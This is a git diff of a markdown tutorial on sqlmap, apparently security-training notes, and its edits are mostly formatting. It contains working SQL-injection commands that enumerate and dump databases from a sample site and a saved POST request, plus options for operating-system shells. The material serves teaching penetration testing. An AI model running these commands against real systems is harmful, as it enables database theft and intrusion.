@@ -4,7 +4,6 @@ Installing Sqlmap
 If you're using Kali Linux, sqlmap is pre-installed. Otherwise, you can download it here: https://github.com/sqlmapproject/sqlmap
 
 # Commands
-### **Basic** commands:  
 
 |**Options**|**Description**|
 |---|---|
@@ -36,7 +35,7 @@ These options can be used to enumerate the back-end database management system i
 | `-T <TABLE NAME>` | DBMS database table(s) to enumerate        |
 | `-C <COL>`        | DBMS database table column(s) to enumerate |
 
-### Operating System access commands
+### **Operating System access commands**
 These options can be used to access the back-end database management system on the target operating system.
 
 | **Options**      | **Description**                                        |
@@ -48,20 +47,16 @@ These options can be used to access the back-end database management system on t
 | `--os-smbrelay`  | One-click prompt for an OOB shell, Meterpreter, or VNC |
 
 # UseCase
-
 **Simple HTTP GET Based Test**  
-  
-`sqlmap -u https://testsite.com/page.php?id=7 --dbs`  
 
+`sqlmap -u https://testsite.com/page.php?id=7 --dbs`  
 Here we have used two flags: -u to state the vulnerable URL and --dbs to enumerate the database.
 
-  
 **Simple HTTP POST Based Test**  
 First, we need to identify the vulnerable POST request and save it. In order to save the request, Right Click on the request, select 'Copy to file', and save it to a directory. You could also copy the whole request and save it to a text file as well.
 
 You’ll notice in the request above, we have a POST parameter 'blood_group' which could a vulnerable parameter.
 
-SavedHTTPPOST request
 ```shell-session
 nare@nare$ cat req.txt     #request output saved as a file
 POST /blood/nl-search.php HTTP/1.1
@@ -174,12 +169,12 @@ Database: blood
 
 Once we have available tables, now let’s gather the columns from the table `blood_db`.
 
-**Using GET based Method**
+- **Using GET based Method**
 `sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`  
 
 `sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns`
 
-**Using POST based Method**
+- **Using POST based Method**
 `sqlmap -r req.txt -D <database_name> -T <table_name> --columns`  
 
 `sqlmap -r req.txt -D blood -T blood_db --columns`
@@ -187,13 +182,12 @@ Once we have available tables, now let’s gather the columns from the table `b
 
 Or we can simply dump all the available databases and tables using the following commands.  
 
-**Using GET based Method**
+- **Using GET based Method**
 `sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-all` 
   
 `sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all`  
 
-  
-**Using POST based Method**
+- **Using POST based Method**
 `sqlmap -r req.txt -D <database_name> --dump-all`  
   
 `sqlmap -r req.txt-p  -D <database_name> --dump-all`  
